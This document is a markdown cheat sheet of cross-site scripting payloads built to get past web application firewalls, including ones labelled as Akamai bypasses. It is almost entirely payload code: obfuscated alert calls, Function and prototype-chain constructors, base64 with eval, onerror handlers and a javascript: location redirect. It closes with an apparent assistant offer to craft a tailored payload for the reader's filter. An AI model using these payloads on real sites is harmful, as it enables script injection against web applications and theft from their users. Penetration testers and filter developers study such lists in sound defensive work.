### these pop up alert:
```
<script type="text/javascript">
window.mrcFormConfig = {"test":"input"};alert(1) 
</script>
```
```
<script type="text/javascript">
window.mrcFormConfig = {"test":alert`1`} 
</script>
```
```
<script type="text/javascript">
window.mrcFormConfig = "";alert`1`//" 
</script>
```
### waf bypass payload if input reflect in script tag

```
<script> 
alert`1`
</script>

```
### note: encode + to %2B then these payloads work
### akamai bypass
```
al%0aert(origin)//
''.sub.constructor('al'+'ert(1)')();//
''.sub.constructor('al'+'ert(1)')(); //
document['defaultView']['al'+'ert'](1)
window['al'+'ert'](1)
window['al\x65rt'](1)
window['al\u0065rt'](1)
window['\x61\x6c\x65\x72\x74'](1)
window['\u0061\u006c\u0065\u0072\x74'](1)
atob('YWxlcnQoMSk=')
```
### new working bypass
```
self['al'+'ert'](1)
globalThis['al'+'ert'](1)
frames['al'+'ert'](1)
[].constructor.constructor('al'+'ert(1)')()
true.constructor.constructor('al'+'ert(1)')()
/./.constructor.constructor('al'+'ert(1)')()
document['defaultView']['al'+'ert'](1)
onerror=globalThis['al'+'ert'];throw 1
```
### all waf bypass put these in alert`1`
```
''.sub.constructor('al'+'ert(1)')();//
location='jav'+'ascript:con'+'firm`1`'; //
window['al\x65rt'](1)
window['al'+'ert'](1); //
this['al'+'ert'](1); //
top['al'+'ert'](1); //
parent['al'+'ert'](1); //
''.sub.constructor('al'+'ert(1)')(); //
window['al\u0065rt'](1)
window['\x61\x6c\x65\x72\x74'](1)
window['\u0061\u006c\u0065\u0072\x74'](1)
atob('YWxlcnQoMSk=')
Function('ale'+'rt(1)')()
Function('\x61\x6c\x65\x72\x74\x28\x31\x29')()
eval(atob('YWxlcnQoMSk='))
self['al'+'ert'](1)
globalThis['al'+'ert'](1)
frames['al'+'ert'](1)
[].constructor.constructor('al'+'ert(1)')()
true.constructor.constructor('al'+'ert(1)')()
/./.constructor.constructor('al'+'ert(1)')()
document['defaultView']['al'+'ert'](1)
onerror=globalThis['al'+'ert'];throw 1
</script><img src=x onerror="window['al'+'ert'](1)">
```

## Global Object References

* self
```
self['al'+'ert'](1)
```
* globalThis
```
globalThis['al'+'ert'](1)
```
* frames
```
frames['al'+'ert'](1)
```
* content
```
content['al'+'ert'](1)
```
* opener
```
opener['al'+'ert'](1)
```

## Object Constructor & Prototype Chains

* [].constructor.constructor (Array to Function)
```
[].constructor.constructor('al'+'ert(1)')()
```
* true.constructor.constructor (Boolean to Function)
```
true.constructor.constructor('al'+'ert(1)')()
```
* /./.constructor.constructor (Regex to Function)
```
/./.constructor.constructor('al'+'ert(1)')()
```
* ({}).constructor (Object literal)
```
({}).constructor.keys(self)[0]
```
* [].__proto__.constructor (Dunder proto)
```
[]['__proto__']['constructor']('al'+'ert(1)')()
```

## Document & Execution Contexts

* document (Via defaultView)
```
document['defaultView']['al'+'ert'](1)
```
* event (Implicit event execution)
```
event['target']['ownerDocument']['defaultView']['al'+'ert'](1)
```
* onerror (Global handler redirection)
```
onerror=globalThis['al'+'ert'];throw 1
```

To construct the perfect string payload, let me know:

* Is the WAF blocking square brackets [ and ]?
* Is the WAF blocking single or double quotes ' or "?
* Are you trying to execute this inside an HTML attribute (like onload) or inside an existing script tag?


